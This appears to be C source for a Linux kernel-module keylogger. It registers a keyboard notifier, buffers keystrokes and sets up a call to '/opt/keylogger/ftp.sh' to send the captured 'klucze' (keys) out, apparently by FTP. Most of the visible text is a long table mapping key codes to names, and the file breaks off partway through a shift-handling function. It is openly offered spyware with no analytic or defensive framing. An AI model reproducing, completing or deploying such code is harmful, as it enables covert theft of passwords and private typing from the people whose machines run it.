#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>
#include <linux/proc_fs.h>
#include <linux/kmod.h>
 
MODULE_LICENSE("Dual BSD/GPL");
 
static int key_cb(struct notifier_block *nblock,
        unsigned long code,
        void *_param);
 
static struct notifier_block key_blk = {
    .notifier_call = key_cb,
};
 
static int count = 0 ;
static const int buffor_size = 999;
char buffor[2][1000];
int cur_buf_nr = 0;
static int index = 0;
char *argv[] = { "/bin/bash",  "/opt/keylogger/ftp.sh","klucze", NULL};
char *envp[] = {NULL};
 
 
char* parse_code(int x){
    if ( x  == KEY_RESERVED) return "KEY_RESERVED ";
    if ( x  == KEY_ESC) return "KEY_ESC ";
    if ( x  == KEY_1) return "KEY_1 ";
    if ( x  == KEY_2) return "KEY_2 ";
    if ( x  == KEY_3) return "KEY_3 ";
    if ( x  == KEY_4) return "KEY_4 ";
    if ( x  == KEY_5) return "KEY_5 ";
    if ( x  == KEY_6) return "KEY_6 ";
    if ( x  == KEY_7) return "KEY_7 ";
    if ( x  == KEY_8) return "KEY_8 ";
    if ( x  == KEY_9) return "KEY_9 ";
    if ( x  == KEY_0) return "KEY_0 ";
    if ( x  == KEY_MINUS) return "KEY_MINUS ";
    if ( x  == KEY_EQUAL) return "KEY_EQUAL ";
    if ( x  == KEY_BACKSPACE) return "KEY_BACKSPACE ";
    if ( x  == KEY_TAB) return "KEY_TAB ";
    if ( x  == KEY_Q) return "KEY_Q ";
    if ( x  == KEY_W) return "KEY_W ";
    if ( x  == KEY_E) return "KEY_E ";
    if ( x  == KEY_R) return "KEY_R ";
    if ( x  == KEY_T) return "KEY_T ";
    if ( x  == KEY_Y) return "KEY_Y ";
    if ( x  == KEY_U) return "KEY_U ";
    if ( x  == KEY_I) return "KEY_I ";
    if ( x  == KEY_O) return "KEY_O ";
    if ( x  == KEY_P) return "KEY_P ";
    if ( x  == KEY_LEFTBRACE) return "KEY_LEFTBRACE ";
    if ( x  == KEY_RIGHTBRACE) return "KEY_RIGHTBRACE ";
    if ( x  == KEY_ENTER) return "KEY_ENTER ";
    if ( x  == KEY_LEFTCTRL) return "KEY_LEFTCTRL ";
    if ( x  == KEY_A) return "KEY_A ";
    if ( x  == KEY_S) return "KEY_S ";
    if ( x  == KEY_D) return "KEY_D ";
    if ( x  == KEY_F) return "KEY_F ";
    if ( x  == KEY_G) return "KEY_G ";
    if ( x  == KEY_H) return "KEY_H ";
    if ( x  == KEY_J) return "KEY_J ";
    if ( x  == KEY_K) return "KEY_K ";
    if ( x  == KEY_L) return "KEY_L ";
    if ( x  == KEY_SEMICOLON) return "KEY_SEMICOLON ";
    if ( x  == KEY_APOSTROPHE) return "KEY_APOSTROPHE ";
    if ( x  == KEY_GRAVE) return "KEY_GRAVE ";
    if ( x  == KEY_LEFTSHIFT) return "KEY_LEFTSHIFT ";
    if ( x  == KEY_BACKSLASH) return "KEY_BACKSLASH ";
    if ( x  == KEY_Z) return "KEY_Z ";
    if ( x  == KEY_X) return "KEY_X ";
    if ( x  == KEY_C) return "KEY_C ";
    if ( x  == KEY_V) return "KEY_V ";
    if ( x  == KEY_B) return "KEY_B ";
    if ( x  == KEY_N) return "KEY_N ";
    if ( x  == KEY_M) return "KEY_M ";
    if ( x  == KEY_COMMA) return "KEY_COMMA ";
    if ( x  == KEY_DOT) return "KEY_DOT ";
    if ( x  == KEY_SLASH) return "KEY_SLASH ";
    if ( x  == KEY_RIGHTSHIFT) return "KEY_RIGHTSHIFT ";
    if ( x  == KEY_KPASTERISK) return "KEY_KPASTERISK ";
    if ( x  == KEY_LEFTALT) return "KEY_LEFTALT ";
    if ( x  == KEY_SPACE) return "KEY_SPACE ";
    if ( x  == KEY_CAPSLOCK) return "KEY_CAPSLOCK ";
    if ( x  == KEY_F1) return "KEY_F1 ";
    if ( x  == KEY_F2) return "KEY_F2 ";
    if ( x  == KEY_F3) return "KEY_F3 ";
    if ( x  == KEY_F4) return "KEY_F4 ";
    if ( x  == KEY_F5) return "KEY_F5 ";
    if ( x  == KEY_F6) return "KEY_F6 ";
    if ( x  == KEY_F7) return "KEY_F7 ";
    if ( x  == KEY_F8) return "KEY_F8 ";
    if ( x  == KEY_F9) return "KEY_F9 ";
    if ( x  == KEY_F10) return "KEY_F10 ";
    if ( x  == KEY_NUMLOCK) return "KEY_NUMLOCK ";
    if ( x  == KEY_SCROLLLOCK) return "KEY_SCROLLLOCK ";
    if ( x  == KEY_KP7) return "KEY_KP7 ";
    if ( x  == KEY_KP8) return "KEY_KP8 ";
    if ( x  == KEY_KP9) return "KEY_KP9 ";
    if ( x  == KEY_KPMINUS) return "KEY_KPMINUS ";
    if ( x  == KEY_KP4) return "KEY_KP4 ";
    if ( x  == KEY_KP5) return "KEY_KP5 ";
    if ( x  == KEY_KP6) return "KEY_KP6 ";
    if ( x  == KEY_KPPLUS) return "KEY_KPPLUS ";
    if ( x  == KEY_KP1) return "KEY_KP1 ";
    if ( x  == KEY_KP2) return "KEY_KP2 ";
    if ( x  == KEY_KP3) return "KEY_KP3 ";
    if ( x  == KEY_KP0) return "KEY_KP0 ";
    if ( x  == KEY_KPDOT) return "KEY_KPDOT ";
    if ( x  == KEY_ZENKAKUHANKAKU) return "KEY_ZENKAKUHANKAKU ";
    if ( x  == KEY_102ND) return "KEY_102ND ";
    if ( x  == KEY_F11) return "KEY_F11 ";
    if ( x  == KEY_F12) return "KEY_F12 ";
    if ( x  == KEY_RO) return "KEY_RO ";
    if ( x  == KEY_KATAKANA) return "KEY_KATAKANA ";
    if ( x  == KEY_HIRAGANA) return "KEY_HIRAGANA ";
    if ( x  == KEY_HENKAN) return "KEY_HENKAN ";
    if ( x  == KEY_KATAKANAHIRAGANA) return "KEY_KATAKANAHIRAGANA ";
    if ( x  == KEY_MUHENKAN) return "KEY_MUHENKAN ";
    if ( x  == KEY_KPJPCOMMA) return "KEY_KPJPCOMMA ";
    if ( x  == KEY_KPENTER) return "KEY_KPENTER ";
    if ( x  == KEY_RIGHTCTRL) return "KEY_RIGHTCTRL ";
    if ( x  == KEY_KPSLASH) return "KEY_KPSLASH ";
    if ( x  == KEY_SYSRQ) return "KEY_SYSRQ ";
    if ( x  == KEY_RIGHTALT) return "KEY_RIGHTALT ";
    if ( x  == KEY_LINEFEED) return "KEY_LINEFEED ";
    if ( x  == KEY_HOME) return "KEY_HOME ";
    if ( x  == KEY_UP) return "KEY_UP ";
    if ( x  == KEY_PAGEUP) return "KEY_PAGEUP ";
    if ( x  == KEY_LEFT) return "KEY_LEFT ";
    if ( x  == KEY_RIGHT) return "KEY_RIGHT ";
    if ( x  == KEY_END) return "KEY_END ";
    if ( x  == KEY_DOWN) return "KEY_DOWN ";
    if ( x  == KEY_PAGEDOWN) return "KEY_PAGEDOWN ";
    if ( x  == KEY_INSERT) return "KEY_INSERT ";
    if ( x  == KEY_DELETE) return "KEY_DELETE ";
    if ( x  == KEY_MACRO) return "KEY_MACRO ";
    if ( x  == KEY_MUTE) return "KEY_MUTE ";
    if ( x  == KEY_VOLUMEDOWN) return "KEY_VOLUMEDOWN ";
    if ( x  == KEY_VOLUMEUP) return "KEY_VOLUMEUP ";
    if ( x  == KEY_POWER) return "KEY_POWER ";
    if ( x  == KEY_KPEQUAL) return "KEY_KPEQUAL ";
    if ( x  == KEY_KPPLUSMINUS) return "KEY_KPPLUSMINUS ";
    if ( x  == KEY_PAUSE) return "KEY_PAUSE ";
    if ( x  == KEY_SCALE) return "KEY_SCALE ";
    if ( x  == KEY_KPCOMMA) return "KEY_KPCOMMA ";
    if ( x  == KEY_HANGEUL) return "KEY_HANGEUL ";
    if ( x  == KEY_HANGUEL) return "KEY_HANGUEL ";
    if ( x  == KEY_HANJA) return "KEY_HANJA ";
    if ( x  == KEY_YEN) return "KEY_YEN ";
    if ( x  == KEY_LEFTMETA) return "KEY_LEFTMETA ";
    if ( x  == KEY_RIGHTMETA) return "KEY_RIGHTMETA ";
    if ( x  == KEY_COMPOSE) return "KEY_COMPOSE ";
    if ( x  == KEY_STOP) return "KEY_STOP ";
    if ( x  == KEY_AGAIN) return "KEY_AGAIN ";
    if ( x  == KEY_PROPS) return "KEY_PROPS ";
    if ( x  == KEY_UNDO) return "KEY_UNDO ";
    if ( x  == KEY_FRONT) return "KEY_FRONT ";
    if ( x  == KEY_COPY) return "KEY_COPY ";
    if ( x  == KEY_OPEN) return "KEY_OPEN ";
    if ( x  == KEY_PASTE) return "KEY_PASTE ";
    if ( x  == KEY_FIND) return "KEY_FIND ";
    if ( x  == KEY_CUT) return "KEY_CUT ";
    if ( x  == KEY_HELP) return "KEY_HELP ";
    if ( x  == KEY_MENU) return "KEY_MENU ";
    if ( x  == KEY_CALC) return "KEY_CALC ";
    if ( x  == KEY_SETUP) return "KEY_SETUP ";
    if ( x  == KEY_SLEEP) return "KEY_SLEEP ";
    if ( x  == KEY_WAKEUP) return "KEY_WAKEUP ";
    if ( x  == KEY_FILE) return "KEY_FILE ";
    if ( x  == KEY_SENDFILE) return "KEY_SENDFILE ";
    if ( x  == KEY_DELETEFILE) return "KEY_DELETEFILE ";
    if ( x  == KEY_XFER) return "KEY_XFER ";
    if ( x  == KEY_PROG1) return "KEY_PROG1 ";
    if ( x  == KEY_PROG2) return "KEY_PROG2 ";
    if ( x  == KEY_WWW) return "KEY_WWW ";
    if ( x  == KEY_MSDOS) return "KEY_MSDOS ";
    if ( x  == KEY_COFFEE) return "KEY_COFFEE ";
    if ( x  == KEY_SCREENLOCK) return "KEY_SCREENLOCK ";
    if ( x  == KEY_ROTATE_DISPLAY) return "KEY_ROTATE_DISPLAY ";
    if ( x  == KEY_DIRECTION) return "KEY_DIRECTION ";
    if ( x  == KEY_CYCLEWINDOWS) return "KEY_CYCLEWINDOWS ";
    if ( x  == KEY_MAIL) return "KEY_MAIL ";
    if ( x  == KEY_BOOKMARKS) return "KEY_BOOKMARKS ";
    if ( x  == KEY_COMPUTER) return "KEY_COMPUTER ";
    if ( x  == KEY_BACK) return "KEY_BACK ";
    if ( x  == KEY_FORWARD) return "KEY_FORWARD ";
    if ( x  == KEY_CLOSECD) return "KEY_CLOSECD ";
    if ( x  == KEY_EJECTCD) return "KEY_EJECTCD ";
    if ( x  == KEY_EJECTCLOSECD) return "KEY_EJECTCLOSECD ";
    if ( x  == KEY_NEXTSONG) return "KEY_NEXTSONG ";
    if ( x  == KEY_PLAYPAUSE) return "KEY_PLAYPAUSE ";
    if ( x  == KEY_PREVIOUSSONG) return "KEY_PREVIOUSSONG ";
    if ( x  == KEY_STOPCD) return "KEY_STOPCD ";
    if ( x  == KEY_RECORD) return "KEY_RECORD ";
    if ( x  == KEY_REWIND) return "KEY_REWIND ";
    if ( x  == KEY_PHONE) return "KEY_PHONE ";
    if ( x  == KEY_ISO) return "KEY_ISO ";
    if ( x  == KEY_CONFIG) return "KEY_CONFIG ";
    if ( x  == KEY_HOMEPAGE) return "KEY_HOMEPAGE ";
    if ( x  == KEY_REFRESH) return "KEY_REFRESH ";
    if ( x  == KEY_EXIT) return "KEY_EXIT ";
    if ( x  == KEY_MOVE) return "KEY_MOVE ";
    if ( x  == KEY_EDIT) return "KEY_EDIT ";
    if ( x  == KEY_SCROLLUP) return "KEY_SCROLLUP ";
    if ( x  == KEY_SCROLLDOWN) return "KEY_SCROLLDOWN ";
    if ( x  == KEY_KPLEFTPAREN) return "KEY_KPLEFTPAREN ";
    if ( x  == KEY_KPRIGHTPAREN) return "KEY_KPRIGHTPAREN ";
    if ( x  == KEY_NEW) return "KEY_NEW ";
    if ( x  == KEY_REDO) return "KEY_REDO ";
    if ( x  == KEY_F13) return "KEY_F13 ";
    if ( x  == KEY_F14) return "KEY_F14 ";
    if ( x  == KEY_F15) return "KEY_F15 ";
    if ( x  == KEY_F16) return "KEY_F16 ";
    if ( x  == KEY_F17) return "KEY_F17 ";
    if ( x  == KEY_F18) return "KEY_F18 ";
    if ( x  == KEY_F19) return "KEY_F19 ";
    if ( x  == KEY_F20) return "KEY_F20 ";
    if ( x  == KEY_F21) return "KEY_F21 ";
    if ( x  == KEY_F22) return "KEY_F22 ";
    if ( x  == KEY_F23) return "KEY_F23 ";
    if ( x  == KEY_F24) return "KEY_F24 ";
    if ( x  == KEY_PLAYCD) return "KEY_PLAYCD ";
    if ( x  == KEY_PAUSECD) return "KEY_PAUSECD ";
    if ( x  == KEY_PROG3) return "KEY_PROG3 ";
    if ( x  == KEY_PROG4) return "KEY_PROG4 ";
    if ( x  == KEY_DASHBOARD) return "KEY_DASHBOARD ";
    if ( x  == KEY_SUSPEND) return "KEY_SUSPEND ";
    if ( x  == KEY_CLOSE) return "KEY_CLOSE ";
    if ( x  == KEY_PLAY) return "KEY_PLAY ";
    if ( x  == KEY_FASTFORWARD) return "KEY_FASTFORWARD ";
    if ( x  == KEY_BASSBOOST) return "KEY_BASSBOOST ";
    if ( x  == KEY_PRINT) return "KEY_PRINT ";
    if ( x  == KEY_HP) return "KEY_HP ";
    if ( x  == KEY_CAMERA) return "KEY_CAMERA ";
    if ( x  == KEY_SOUND) return "KEY_SOUND ";
    if ( x  == KEY_QUESTION) return "KEY_QUESTION ";
    if ( x  == KEY_EMAIL) return "KEY_EMAIL ";
    if ( x  == KEY_CHAT) return "KEY_CHAT ";
    if ( x  == KEY_SEARCH) return "KEY_SEARCH ";
    if ( x  == KEY_CONNECT) return "KEY_CONNECT ";
    if ( x  == KEY_FINANCE) return "KEY_FINANCE ";
    if ( x  == KEY_SPORT) return "KEY_SPORT ";
    if ( x  == KEY_SHOP) return "KEY_SHOP ";
    if ( x  == KEY_ALTERASE) return "KEY_ALTERASE ";
    if ( x  == KEY_CANCEL) return "KEY_CANCEL ";
    if ( x  == KEY_BRIGHTNESSDOWN) return "KEY_BRIGHTNESSDOWN ";
    if ( x  == KEY_BRIGHTNESSUP) return "KEY_BRIGHTNESSUP ";
    if ( x  == KEY_MEDIA) return "KEY_MEDIA ";
    if ( x  == KEY_SWITCHVIDEOMODE) return "KEY_SWITCHVIDEOMODE ";
    if ( x  == KEY_KBDILLUMTOGGLE) return "KEY_KBDILLUMTOGGLE ";
    if ( x  == KEY_KBDILLUMDOWN) return "KEY_KBDILLUMDOWN ";
    if ( x  == KEY_KBDILLUMUP) return "KEY_KBDILLUMUP ";
    if ( x  == KEY_SEND) return "KEY_SEND ";
    if ( x  == KEY_REPLY) return "KEY_REPLY ";
    if ( x  == KEY_FORWARDMAIL) return "KEY_FORWARDMAIL ";
    if ( x  == KEY_SAVE) return "KEY_SAVE ";
    if ( x  == KEY_DOCUMENTS) return "KEY_DOCUMENTS ";
    if ( x  == KEY_BATTERY) return "KEY_BATTERY ";
    if ( x  == KEY_BLUETOOTH) return "KEY_BLUETOOTH ";
    if ( x  == KEY_WLAN) return "KEY_WLAN ";
    if ( x  == KEY_UWB) return "KEY_UWB ";
    if ( x  == KEY_UNKNOWN) return "KEY_UNKNOWN ";
    if ( x  == KEY_VIDEO_NEXT) return "KEY_VIDEO_NEXT ";
    if ( x  == KEY_VIDEO_PREV) return "KEY_VIDEO_PREV ";
    if ( x  == KEY_BRIGHTNESS_CYCLE) return "KEY_BRIGHTNESS_CYCLE ";
    if ( x  == KEY_BRIGHTNESS_AUTO) return "KEY_BRIGHTNESS_AUTO ";
    if ( x  == KEY_BRIGHTNESS_ZERO) return "KEY_BRIGHTNESS_ZERO ";
    if ( x  == KEY_DISPLAY_OFF) return "KEY_DISPLAY_OFF ";
    if ( x  == KEY_WWAN) return "KEY_WWAN ";
    if ( x  == KEY_WIMAX) return "KEY_WIMAX ";
    if ( x  == KEY_RFKILL) return "KEY_RFKILL ";
    if ( x  == KEY_MICMUTE) return "KEY_MICMUTE ";
    if ( x  == KEY_OK) return "KEY_OK ";
    if ( x  == KEY_SELECT) return "KEY_SELECT ";
    if ( x  == KEY_GOTO) return "KEY_GOTO ";
    if ( x  == KEY_CLEAR) return "KEY_CLEAR ";
    if ( x  == KEY_POWER2) return "KEY_POWER2 ";
    if ( x  == KEY_OPTION) return "KEY_OPTION ";
    if ( x  == KEY_INFO) return "KEY_INFO ";
    if ( x  == KEY_TIME) return "KEY_TIME ";
    if ( x  == KEY_VENDOR) return "KEY_VENDOR ";
    if ( x  == KEY_ARCHIVE) return "KEY_ARCHIVE ";
    if ( x  == KEY_PROGRAM) return "KEY_PROGRAM ";
    if ( x  == KEY_CHANNEL) return "KEY_CHANNEL ";
    if ( x  == KEY_FAVORITES) return "KEY_FAVORITES ";
    if ( x  == KEY_EPG) return "KEY_EPG ";
    if ( x  == KEY_PVR) return "KEY_PVR ";
    if ( x  == KEY_MHP) return "KEY_MHP ";
    if ( x  == KEY_LANGUAGE) return "KEY_LANGUAGE ";
    if ( x  == KEY_TITLE) return "KEY_TITLE ";
    if ( x  == KEY_SUBTITLE) return "KEY_SUBTITLE ";
    if ( x  == KEY_ANGLE) return "KEY_ANGLE ";
    if ( x  == KEY_ZOOM) return "KEY_ZOOM ";
    if ( x  == KEY_MODE) return "KEY_MODE ";
    if ( x  == KEY_KEYBOARD) return "KEY_KEYBOARD ";
    if ( x  == KEY_SCREEN) return "KEY_SCREEN ";
    if ( x  == KEY_PC) return "KEY_PC ";
    if ( x  == KEY_TV) return "KEY_TV ";
    if ( x  == KEY_TV2) return "KEY_TV2 ";
    if ( x  == KEY_VCR) return "KEY_VCR ";
    if ( x  == KEY_VCR2) return "KEY_VCR2 ";
    if ( x  == KEY_SAT) return "KEY_SAT ";
    if ( x  == KEY_SAT2) return "KEY_SAT2 ";
    if ( x  == KEY_CD) return "KEY_CD ";
    if ( x  == KEY_TAPE) return "KEY_TAPE ";
    if ( x  == KEY_RADIO) return "KEY_RADIO ";
    if ( x  == KEY_TUNER) return "KEY_TUNER ";
    if ( x  == KEY_PLAYER) return "KEY_PLAYER ";
    if ( x  == KEY_TEXT) return "KEY_TEXT ";
    if ( x  == KEY_DVD) return "KEY_DVD ";
    if ( x  == KEY_AUX) return "KEY_AUX ";
    if ( x  == KEY_MP3) return "KEY_MP3 ";
    if ( x  == KEY_AUDIO) return "KEY_AUDIO ";
    if ( x  == KEY_VIDEO) return "KEY_VIDEO ";
    if ( x  == KEY_DIRECTORY) return "KEY_DIRECTORY ";
    if ( x  == KEY_LIST) return "KEY_LIST ";
    if ( x  == KEY_MEMO) return "KEY_MEMO ";
    if ( x  == KEY_CALENDAR) return "KEY_CALENDAR ";
    if ( x  == KEY_RED) return "KEY_RED ";
    if ( x  == KEY_GREEN) return "KEY_GREEN ";
    if ( x  == KEY_YELLOW) return "KEY_YELLOW ";
    if ( x  == KEY_BLUE) return "KEY_BLUE ";
    if ( x  == KEY_CHANNELUP) return "KEY_CHANNELUP ";
    if ( x  == KEY_CHANNELDOWN) return "KEY_CHANNELDOWN ";
    if ( x  == KEY_FIRST) return "KEY_FIRST ";
    if ( x  == KEY_LAST) return "KEY_LAST ";
    if ( x  == KEY_AB) return "KEY_AB ";
    if ( x  == KEY_NEXT) return "KEY_NEXT ";
    if ( x  == KEY_RESTART) return "KEY_RESTART ";
    if ( x  == KEY_SLOW) return "KEY_SLOW ";
    if ( x  == KEY_SHUFFLE) return "KEY_SHUFFLE ";
    if ( x  == KEY_BREAK) return "KEY_BREAK ";
    if ( x  == KEY_PREVIOUS) return "KEY_PREVIOUS ";
    if ( x  == KEY_DIGITS) return "KEY_DIGITS ";
    if ( x  == KEY_TEEN) return "KEY_TEEN ";
    if ( x  == KEY_TWEN) return "KEY_TWEN ";
    if ( x  == KEY_VIDEOPHONE) return "KEY_VIDEOPHONE ";
    if ( x  == KEY_GAMES) return "KEY_GAMES ";
    if ( x  == KEY_ZOOMIN) return "KEY_ZOOMIN ";
    if ( x  == KEY_ZOOMOUT) return "KEY_ZOOMOUT ";
    if ( x  == KEY_ZOOMRESET) return "KEY_ZOOMRESET ";
    if ( x  == KEY_WORDPROCESSOR) return "KEY_WORDPROCESSOR ";
    if ( x  == KEY_EDITOR) return "KEY_EDITOR ";
    if ( x  == KEY_SPREADSHEET) return "KEY_SPREADSHEET ";
    if ( x  == KEY_GRAPHICSEDITOR) return "KEY_GRAPHICSEDITOR ";
    if ( x  == KEY_PRESENTATION) return "KEY_PRESENTATION ";
    if ( x  == KEY_DATABASE) return "KEY_DATABASE ";
    if ( x  == KEY_NEWS) return "KEY_NEWS ";
    if ( x  == KEY_VOICEMAIL) return "KEY_VOICEMAIL ";
    if ( x  == KEY_ADDRESSBOOK) return "KEY_ADDRESSBOOK ";
    if ( x  == KEY_MESSENGER) return "KEY_MESSENGER ";
    if ( x  == KEY_DISPLAYTOGGLE) return "KEY_DISPLAYTOGGLE ";
    if ( x  == KEY_BRIGHTNESS_TOGGLE) return "KEY_BRIGHTNESS_TOGGLE ";
    if ( x  == KEY_SPELLCHECK) return "KEY_SPELLCHECK ";
    if ( x  == KEY_LOGOFF) return "KEY_LOGOFF ";
    if ( x  == KEY_DOLLAR) return "KEY_DOLLAR ";
    if ( x  == KEY_EURO) return "KEY_EURO ";
    if ( x  == KEY_FRAMEBACK) return "KEY_FRAMEBACK ";
    if ( x  == KEY_FRAMEFORWARD) return "KEY_FRAMEFORWARD ";
    if ( x  == KEY_CONTEXT_MENU) return "KEY_CONTEXT_MENU ";
    if ( x  == KEY_MEDIA_REPEAT) return "KEY_MEDIA_REPEAT ";
    if ( x  == KEY_10CHANNELSUP) return "KEY_10CHANNELSUP ";
    if ( x  == KEY_10CHANNELSDOWN) return "KEY_10CHANNELSDOWN ";
    if ( x  == KEY_IMAGES) return "KEY_IMAGES ";
    if ( x  == KEY_DEL_EOL) return "KEY_DEL_EOL ";
    if ( x  == KEY_DEL_EOS) return "KEY_DEL_EOS ";
    if ( x  == KEY_INS_LINE) return "KEY_INS_LINE ";
    if ( x  == KEY_DEL_LINE) return "KEY_DEL_LINE ";
    if ( x  == KEY_FN) return "KEY_FN ";
    if ( x  == KEY_FN_ESC) return "KEY_FN_ESC ";
    if ( x  == KEY_FN_F1) return "KEY_FN_F1 ";
    if ( x  == KEY_FN_F2) return "KEY_FN_F2 ";
    if ( x  == KEY_FN_F3) return "KEY_FN_F3 ";
    if ( x  == KEY_FN_F4) return "KEY_FN_F4 ";
    if ( x  == KEY_FN_F5) return "KEY_FN_F5 ";
    if ( x  == KEY_FN_F6) return "KEY_FN_F6 ";
    if ( x  == KEY_FN_F7) return "KEY_FN_F7 ";
    if ( x  == KEY_FN_F8) return "KEY_FN_F8 ";
    if ( x  == KEY_FN_F9) return "KEY_FN_F9 ";
    if ( x  == KEY_FN_F10) return "KEY_FN_F10 ";
    if ( x  == KEY_FN_F11) return "KEY_FN_F11 ";
    if ( x  == KEY_FN_F12) return "KEY_FN_F12 ";
    if ( x  == KEY_FN_1) return "KEY_FN_1 ";
    if ( x  == KEY_FN_2) return "KEY_FN_2 ";
    if ( x  == KEY_FN_D) return "KEY_FN_D ";
    if ( x  == KEY_FN_E) return "KEY_FN_E ";
    if ( x  == KEY_FN_F) return "KEY_FN_F ";
    if ( x  == KEY_FN_S) return "KEY_FN_S ";
    if ( x  == KEY_FN_B) return "KEY_FN_B ";
    if ( x  == KEY_BRL_DOT1) return "KEY_BRL_DOT1 ";
    if ( x  == KEY_BRL_DOT2) return "KEY_BRL_DOT2 ";
    if ( x  == KEY_BRL_DOT3) return "KEY_BRL_DOT3 ";
    if ( x  == KEY_BRL_DOT4) return "KEY_BRL_DOT4 ";
    if ( x  == KEY_BRL_DOT5) return "KEY_BRL_DOT5 ";
    if ( x  == KEY_BRL_DOT6) return "KEY_BRL_DOT6 ";
    if ( x  == KEY_BRL_DOT7) return "KEY_BRL_DOT7 ";
    if ( x  == KEY_BRL_DOT8) return "KEY_BRL_DOT8 ";
    if ( x  == KEY_BRL_DOT9) return "KEY_BRL_DOT9 ";
    if ( x  == KEY_BRL_DOT10) return "KEY_BRL_DOT10 ";
    if ( x  == KEY_NUMERIC_0) return "KEY_NUMERIC_0 ";
    if ( x  == KEY_NUMERIC_1) return "KEY_NUMERIC_1 ";
    if ( x  == KEY_NUMERIC_2) return "KEY_NUMERIC_2 ";
    if ( x  == KEY_NUMERIC_3) return "KEY_NUMERIC_3 ";
    if ( x  == KEY_NUMERIC_4) return "KEY_NUMERIC_4 ";
    if ( x  == KEY_NUMERIC_5) return "KEY_NUMERIC_5 ";
    if ( x  == KEY_NUMERIC_6) return "KEY_NUMERIC_6 ";
    if ( x  == KEY_NUMERIC_7) return "KEY_NUMERIC_7 ";
    if ( x  == KEY_NUMERIC_8) return "KEY_NUMERIC_8 ";
    if ( x  == KEY_NUMERIC_9) return "KEY_NUMERIC_9 ";
    if ( x  == KEY_NUMERIC_STAR) return "KEY_NUMERIC_STAR ";
    if ( x  == KEY_NUMERIC_POUND) return "KEY_NUMERIC_POUND ";
    if ( x  == KEY_NUMERIC_A) return "KEY_NUMERIC_A ";
    if ( x  == KEY_NUMERIC_B) return "KEY_NUMERIC_B ";
    if ( x  == KEY_NUMERIC_C) return "KEY_NUMERIC_C ";
    if ( x  == KEY_NUMERIC_D) return "KEY_NUMERIC_D ";
    if ( x  == KEY_CAMERA_FOCUS) return "KEY_CAMERA_FOCUS ";
    if ( x  == KEY_WPS_BUTTON) return "KEY_WPS_BUTTON ";
    if ( x  == KEY_TOUCHPAD_TOGGLE) return "KEY_TOUCHPAD_TOGGLE ";
    if ( x  == KEY_TOUCHPAD_ON) return "KEY_TOUCHPAD_ON ";
    if ( x  == KEY_TOUCHPAD_OFF) return "KEY_TOUCHPAD_OFF ";
    if ( x  == KEY_CAMERA_ZOOMIN) return "KEY_CAMERA_ZOOMIN ";
    if ( x  == KEY_CAMERA_ZOOMOUT) return "KEY_CAMERA_ZOOMOUT ";
    if ( x  == KEY_CAMERA_UP) return "KEY_CAMERA_UP ";
    if ( x  == KEY_CAMERA_DOWN) return "KEY_CAMERA_DOWN ";
    if ( x  == KEY_CAMERA_LEFT) return "KEY_CAMERA_LEFT ";
    if ( x  == KEY_CAMERA_RIGHT) return "KEY_CAMERA_RIGHT ";
    if ( x  == KEY_ATTENDANT_ON) return "KEY_ATTENDANT_ON ";
    if ( x  == KEY_ATTENDANT_OFF) return "KEY_ATTENDANT_OFF ";
    if ( x  == KEY_ATTENDANT_TOGGLE) return "KEY_ATTENDANT_TOGGLE ";
    if ( x  == KEY_LIGHTS_TOGGLE) return "KEY_LIGHTS_TOGGLE ";
    if ( x  == KEY_ALS_TOGGLE) return "KEY_ALS_TOGGLE ";
    if ( x  == KEY_BUTTONCONFIG) return "KEY_BUTTONCONFIG ";
    if ( x  == KEY_TASKMANAGER) return "KEY_TASKMANAGER ";
    if ( x  == KEY_JOURNAL) return "KEY_JOURNAL ";
    if ( x  == KEY_CONTROLPANEL) return "KEY_CONTROLPANEL ";
    if ( x  == KEY_APPSELECT) return "KEY_APPSELECT ";
    if ( x  == KEY_SCREENSAVER) return "KEY_SCREENSAVER ";
    if ( x  == KEY_VOICECOMMAND) return "KEY_VOICECOMMAND ";
    if ( x  == KEY_ASSISTANT) return "KEY_ASSISTANT ";
    if ( x  == KEY_BRIGHTNESS_MIN) return "KEY_BRIGHTNESS_MIN ";
    if ( x  == KEY_BRIGHTNESS_MAX) return "KEY_BRIGHTNESS_MAX ";
    if ( x  == KEY_KBDINPUTASSIST_PREV) return "KEY_KBDINPUTASSIST_PREV ";
    if ( x  == KEY_KBDINPUTASSIST_NEXT) return "KEY_KBDINPUTASSIST_NEXT ";
    if ( x  == KEY_KBDINPUTASSIST_PREVGROUP) return "KEY_KBDINPUTASSIST_PREVGROUP ";
    if ( x  == KEY_KBDINPUTASSIST_NEXTGROUP) return "KEY_KBDINPUTASSIST_NEXTGROUP ";
    if ( x  == KEY_KBDINPUTASSIST_ACCEPT) return "KEY_KBDINPUTASSIST_ACCEPT ";
    if ( x  == KEY_KBDINPUTASSIST_CANCEL) return "KEY_KBDINPUTASSIST_CANCEL ";
    if ( x  == KEY_RIGHT_UP) return "KEY_RIGHT_UP ";
    if ( x  == KEY_RIGHT_DOWN) return "KEY_RIGHT_DOWN ";
    if ( x  == KEY_LEFT_UP) return "KEY_LEFT_UP ";
    if ( x  == KEY_LEFT_DOWN) return "KEY_LEFT_DOWN ";
    if ( x  == KEY_ROOT_MENU) return "KEY_ROOT_MENU ";
    if ( x  == KEY_MEDIA_TOP_MENU) return "KEY_MEDIA_TOP_MENU ";
    if ( x  == KEY_NUMERIC_11) return "KEY_NUMERIC_11 ";
    if ( x  == KEY_NUMERIC_12) return "KEY_NUMERIC_12 ";
    if ( x  == KEY_AUDIO_DESC) return "KEY_AUDIO_DESC ";
    if ( x  == KEY_3D_MODE) return "KEY_3D_MODE ";
    if ( x  == KEY_NEXT_FAVORITE) return "KEY_NEXT_FAVORITE ";
    if ( x  == KEY_STOP_RECORD) return "KEY_STOP_RECORD ";
    if ( x  == KEY_PAUSE_RECORD) return "KEY_PAUSE_RECORD ";
    if ( x  == KEY_VOD) return "KEY_VOD ";
    if ( x  == KEY_UNMUTE) return "KEY_UNMUTE ";
    if ( x  == KEY_FASTREVERSE) return "KEY_FASTREVERSE ";
    if ( x  == KEY_SLOWREVERSE) return "KEY_SLOWREVERSE ";
    if ( x  == KEY_DATA) return "KEY_DATA ";
    if ( x  == KEY_ONSCREEN_KEYBOARD) return "KEY_ONSCREEN_KEYBOARD ";
    if ( x  == KEY_MIN_INTERESTING) return "KEY_MIN_INTERESTING ";
    if ( x  == KEY_MAX) return "KEY_MAX ";
    if ( x  == KEY_CNT) return "KEY_CNT ";
    return "?";
 
}
 
char* parse_shift(int shift){
    if(shift == 0 ) return "";
    else if(shift == 1 ) return "SHIFT_";
